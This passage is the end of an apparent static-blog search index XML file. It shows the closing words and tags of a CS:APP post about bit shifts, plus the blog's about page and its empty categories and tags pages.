n)$位，进行了逻辑右移，再强制转换为有符号int。</p>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p>用尽一生，活成一个平凡人。</p>]]></content>
      
    </entry>
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
  
</search>
